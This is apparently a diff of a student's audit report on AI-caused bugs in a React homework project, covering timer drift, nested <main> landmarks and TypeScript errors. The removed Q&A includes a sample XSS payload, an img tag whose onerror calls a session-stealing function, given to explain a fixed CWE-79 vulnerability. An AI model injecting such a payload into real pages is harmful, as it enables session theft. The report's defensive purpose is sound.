+## Failure #04 — Module-Scope JSX Placement, Nested `<main>` Landmark & Implicit-`any` Cascade
 
-#### Q1: "Why does standard `setInterval` drift over time, and how does your Zero-Drift Timer guarantee exact wall-clock synchronization?"
-> **Model Answer:**  
-> Standard `setInterval(fn, delay)` only guarantees that callback execution will be queued after *at least* `delay` milliseconds. It is vulnerable to two major causes of drift:  
-> 1. **Macrotask queue blocking:** If synchronous JavaScript execution or garbage collection on the browser main thread takes longer than the interval (e.g., during complex layout or DOM calculation), timer execution is delayed. These delays accumulate monotonically over time.  
-> 2. **Background tab throttling:** When users switch tabs, browsers throttle timers to 1000ms intervals or halt them to conserve CPU and battery.  
-> Our **Zero-Drift Timer** eliminates this completely by storing the target epoch timestamp (`targetTime = Date.now() + durationMs`) and recalculating `remaining = Math.max(0, targetTime - Date.now())` inside `requestAnimationFrame`. Even if the main thread is blocked for 500ms or throttled in a background tab, the very next frame immediately recalibrates to the exact physical wall clock, resulting in **0 ms cumulative drift**.
+### 1. AI Prompt
+Actual user prompts during incremental HW3 integration:
+- `"chỉnh sửa code này sao cho phù hợp đi <main className=\"pubg-esports-platform\"><PubgLeaderboard /><PubgKillFeed /></main>"`
+- `"sao nó vẫn báo lỗi ở đây mport { INITIAL_KILL_FEED } from '../data/pubg-leaderboard-data'; tại file"`
 
-#### Q2: "How does the Optimistic Inventory Lock Finite State Machine prevent overselling during high-concurrency bot floods?"
-> **Model Answer:**  
-> In high-traffic flash sales, traditional pessimistic locking degrades throughput due to database lock contention. We implement **Optimistic Concurrency Control (OCC)** coupled with a formal Finite State Machine (FSM):  
-> - When a customer or bot attempts reservation, the engine checks whether `availableStock > 0`.  
-> - If available, it issues a 30-second cryptographic lease token (`lockId`) and atomic state transition `AVAILABLE -> RESERVED`. Available stock is immediately decremented and moved to `reservedStock`.  
-> - Each transaction compares and increments a monotonically increasing `version` sequence number. If a race condition occurs or the item sells out, conflicting requests are rejected immediately with `409 Conflict` or `410 Gone`.  
-> - Crucially, the mathematical invariant $\text{totalStock} = \text{availableStock} + \text{reservedStock} + \text{soldStock}$ is strictly conserved, guaranteeing that oversold units remain strictly **0**.
+### 2. AI-Generated Code
+```html
+<!-- Original index.html (line 17) -->
+<main id="root"></main>
+```
 
-#### Q3: "What happens if a buyer locks inventory but abandons their browser or disconnects before paying?"
-> **Model Answer:**  
-> When inventory is reserved, the FSM starts a 30-second TTL (Time-To-Live) timer associated with that specific `lockId`.  
-> If checkout confirmation (`PURCHASED`) is not dispatched before TTL expiry, the FSM automatically triggers the transition `RESERVED -> LOCK_EXPIRED`. The held unit is subtracted from `reservedStock` and added back to `availableStock`, immediately re-enabling other waiting customers to purchase it. If the component unmounts, `fsm.destroy()` cancels all orphaned timeouts to prevent memory leaks.
+```tsx
+// Faulty JSX pasted outside App() at module bottom + nested <main> landmark
+      )}
+    </div>
+  );
+}
 
-#### Q4: "How does the application prevent Cross-Site Scripting (XSS) when rendering dynamic merchant product descriptions and vouchers?"
-> **Model Answer:**  
-> The AI assistant initially suggested using `element.innerHTML` and React's `dangerouslySetInnerHTML` for fast voucher and notice formatting. This introduced a critical Stored/DOM XSS vulnerability (CWE-79), where an attacker could inject `<img src=x onerror=stealSession()>`.  
-> We refactored all data rendering to utilize React virtual DOM text interpolation (`{p.name}`, `{p.description}`) and native `textContent` / `replaceChildren()`. React strictly escapes dynamic strings into inert DOM text nodes (`document.createTextNode()`), guaranteeing that HTML tags and JavaScript event handlers are never parsed by the browser layout engine.
+<main className="pubg-esports-platform">
+  <PubgLeaderboard />
+  <PubgKillFeed />
+</main>
+```
 
-#### Q5: "Why did the AI's use of `key={Math.random()}` destroy 60 FPS rendering performance, and how was it diagnosed in Chrome DevTools?"
-> **Model Answer:**  
-> During React reconciliation, the `key` attribute is the primary identifier used to preserve DOM nodes across renders.  
-> When the AI used `key={Math.random()}`, every render pass generated a novel key. React assumed all previous DOM elements were destroyed and mounted brand new elements from scratch on every millisecond tick. This caused continuous style recalibration, layout recalculation, and DOM thrashing, dropping frame rates from 60 FPS to ~15 FPS.  
-> In Chrome DevTools, we verified this using:  
-> 1. **Rendering Tab -> Paint Flashing:** The entire product list and log console flashed green continuously on every tick.  
-> 2. **React Profiler:** Recorded 100% commit re-creation times with reason `"Key changed between renders"`.  
-> We refactored all list keys to deterministic domain identifiers (`key={log.id}`, `key={product.id}`, `key={order.orderId}`), restoring silky-smooth 60 FPS performance.
+Additionally, `INITIAL_SQUAD_STANDINGS` and `INITIAL_KILL_FEED` had been duplicated into `src/data/pubg-crates.ts` with a mid-file `import type`, while unannotated `.filter((squad) => ...)` / `.sort((a, b) => ...)` callbacks triggered cascading `TS7006: Parameter implicitly has an 'any' type` errors in the IDE when module resolution failed.
+
+### 3. Root Cause
+1. JSX expressions placed after the closing `}` of `App()` execute at module top level rather than inside React's render return tree.
+2. Rendering `<main>` inside `App.tsx` while `index.html` already mounted `<main id="root"></main>` violated HTML5 / WAI-ARIA rules prohibiting nested `<main>` landmarks.
+3. Unannotated array callback parameters degrade into cascading `TS7006` diagnostics under `"strict": true` whenever an upstream data module encounters a resolution error.
+
+### 4. Observable Symptoms
+- Syntax/type errors in `src/App.tsx` and `TS2306`/`TS7006` red squiggles in `PubgLeaderboard.tsx` (`3` errors) and `PubgKillFeed.tsx` (`4` errors).
+- Invalid nested `<main>` landmark hierarchy in the browser DOM.
+
+### 5. DevTools Evidence
+1. Inspect `index.html` (`<div id="root"></div>`) and `src/App.tsx` (`<header className="pubg-hero">`, `<main className="pubg-main-content">`, `<footer className="pubg-footer">`).
+2. Open **Chrome DevTools → Elements → Accessibility** pane on `http://localhost:3001`: verify clean top-level `banner` (`header`), `main` (`main.pubg-main-content`), and `contentinfo` (`footer`) landmarks with zero nesting violations.
+3. Run `npx tsc --noEmit` and `npm run build` (`0` errors).
+
+### 6. Manual Engineering Fix
+- Updated `index.html` root container from `<main id="root"></main>` to `<div id="root"></div>`.
+- Structured `src/App.tsx` cleanly into `<header className="pubg-hero">`, `<main className="pubg-main-content">`, and `<footer className="pubg-footer">` inside `export function App()`.
+- Deduplicated `src/data/pubg-crates.ts` and added explicit `PubgVnSquadStanding` and `PubgKillFeedEvent` annotations in `PubgLeaderboard.tsx` and `PubgKillFeed.tsx`.
+
+### 7. Verification
+- Verified via `npx tsc --noEmit` (exit code `0`), `npm run build` (`45 modules transformed`, exit code `0`), and React 19 `renderToStaticMarkup` check.
+
+### 8. Git Commit
+- Fixed in working tree (`index.html`, `src/App.tsx`, `src/data/pubg-crates.ts`, `src/components/PubgLeaderboard.tsx`, `src/components/PubgKillFeed.tsx`); ready for manual commit.
 
 ---
 
-## 8. Review and Verification Checklist
+## 6. Investigation of Remaining Assignment Checklist Categories
 
-- [x] Documented at least 3 discrete, real-world AI failure modes (XSS, Memory Leaks, Phantom Key DOM Thrashing).
-- [x] Evaluated vulnerabilities against industry standards (CWE-79, CWE-401, CWE-400, CVSS 3.1).
-- [x] Provided verifiable Chrome DevTools empirical reproduction methodologies (DOM breakpoints, Heap Snapshots, Paint Flashing).
-- [x] Implemented verified production-grade engineering refactors in the codebase.
-- [x] Engineered automated verification suite proving zero overselling under 100 concurrent workers and zero timer drift.
-- [x] Documented complete Git commit history satisfying the minimum 8 discrete Conventional Commits criterion (10 commits total).
-- [x] Prepared comprehensive oral defense Q&A covering distributed concurrency, FSM lifecycle, and rendering optimization.
+### 6.1 Redundant `useEffect` for Derived State & In-Place `.sort()` Mutation
+- **Status:** **Verified Clean (Avoided by Design)**.
+- **Code Inspection:** Both `src/components/PubgLeaderboard.tsx` (`visibleStandings`) and `src/components/PubgKillFeed.tsx` (`visibleEvents`) compute filtered and sorted views synchronously during render via `useMemo` and shallow-copy `[...filtered].sort(...)` before sorting. Neither component stores derived arrays in `useState` via `useEffect`, and `INITIAL_SQUAD_STANDINGS` / `INITIAL_KILL_FEED` remain strictly unmutated.
+
+### 6.2 Stale Closure in Live Squad Auto-Polling (`setInterval` with `[]`)
+- **Status:** **Not Applicable to Final Static M3 Dataset**.
+- **Code Inspection:** `PubgLeaderboard` and `PubgKillFeed` render clearly labeled client-side demo datasets (`INITIAL_SQUAD_STANDINGS` and `INITIAL_KILL_FEED`) rather than polling a `fetchSquad(squadId)` endpoint. Where `setInterval` *is* used (`src/hooks/usePubgAirdropTimer.ts`), `[targetEpochMs, serverOffsetMs, liveWindowMs]` are all declared in the `useEffect` dependency array so changing `targetEpochMs` or `serverOffsetMs` immediately tears down the old interval/rAF loop and resynchronizes without stale closures.
 
 ---
 
-## 9. Conclusion & Compliance Declaration
+## 7. Summary Audit Matrix
 
-This audit report represents genuine verification, diagnostic tracing, and engineering refactoring conducted on the project codebase:
-- **Project:** HW 3: High-Concurrency Flash-Sale E-Commerce Engine
-- **Workspace:** `24520225_NguyenBaoChinh_Lab02_HW3`
-- **Student:** Nguyen Bao Chinh (MSSV: 24520225)
-- **Institution:** Department of Software Engineering, University of Information Technology (UIT - VNU-HCM)
-- **Compliance Status:** 100% compliant with Homework 03 evaluation criteria, Vietnam 11.11 Flash-Sale specification, and AI Failure Mode Audit standards.
-
+| Failure ID | Defect Category | Affected Files | Engineering Remediation | Verification Status |
+|---|---|---|---|---|
+| **Failure #01** | Naive `setInterval` Countdown Drift & Missing Tab-Wake Resync | `src/hooks/usePubgAirdropTimer.ts`, `src/components/PubgAirdropTimer.tsx` | Reused Lab 2 `createAntiDriftTimer` + `formatCountdown`, `targetEpochMs - (Date.now() + serverOffsetMs)`, second-boundary state guard, `visibilitychange` listener, full cleanup | **Fixed & Build-Verified** (`2679ceb` + working tree) |
+| **Failure #02** | Missing `AbortController` & Timer Cleanup in Async Claim Service | `src/services/pubg-claim-service.ts`, `src/hooks/usePubgCrateClaim.ts` | Added `AbortSignal` support + `clearTimeout` in `claimPubgDrop`, per-drop `AbortController` map + unmount/reset `abort()` cleanup, `AbortError` filter | **Fixed & Runtime-Verified** (working tree) |
+| **Failure #03** | Stale Closure Rollback, `Set` vs `Map` Lock & List-Key Thrashing | `src/hooks/usePubgCrateClaim.ts`, `src/components/PubgArenaMarketplace.tsx` | Upgraded to `Map<dropId, claimId>` lock, `dropsRef` mirror, `inventoryEpochRef` stale-response guard, bounded `+1` rollback, and stable `key={result.claimId}` | **Fixed & Runtime-Verified** (working tree) |
+| **Failure #04** | Module-Scope JSX Placement, Nested `<main>` Landmark & `TS7006` Cascade | `index.html`, `src/App.tsx`, `src/data/pubg-crates.ts`, `src/components/PubgLeaderboard.tsx`, `src/components/PubgKillFeed.tsx` | Replaced `<main id="root">` with `<div id="root">`, structured `<header>`/`<main>`/`<footer>` inside `App()`, deduplicated data, typed callbacks | **Fixed & Build-Verified** (working tree) |
